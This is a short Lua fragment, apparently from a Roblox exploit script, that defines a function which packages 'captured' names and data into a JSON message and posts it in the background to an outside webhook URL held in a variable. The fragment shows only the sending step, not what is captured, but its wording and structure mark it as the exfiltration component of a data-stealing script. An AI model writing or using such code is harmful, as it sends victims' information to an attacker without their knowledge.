local function send(name, info)
    local payload = game:GetService("HttpService"):JSONEncode({
        ["content"] = "Captured: " .. tostring(name) .. " | Data: " .. tostring(info)
    })
    
    task.spawn(function()
        http({
            Url = WH,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = payload
        })
    end)
end

